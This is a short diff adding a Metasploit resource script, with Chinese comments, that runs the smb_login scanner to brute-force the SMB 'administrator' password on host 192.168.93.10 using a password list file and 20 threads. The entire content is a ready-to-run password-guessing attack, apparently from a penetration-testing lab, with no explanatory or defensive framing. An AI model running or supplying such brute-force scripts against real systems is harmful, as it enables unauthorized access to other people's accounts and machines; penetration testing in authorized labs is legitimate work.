@@ -1,0 +1,10 @@
+#使用smb_login模块
+use auxiliary/scanner/smb/smb_login
+#设置目标ip
+set rhosts 192.168.93.10
+#设置爆破的用户名
+set SMBUSER administrator
+#设置字典目录
+set pass_file pwd.txt
+set threads 20
+run
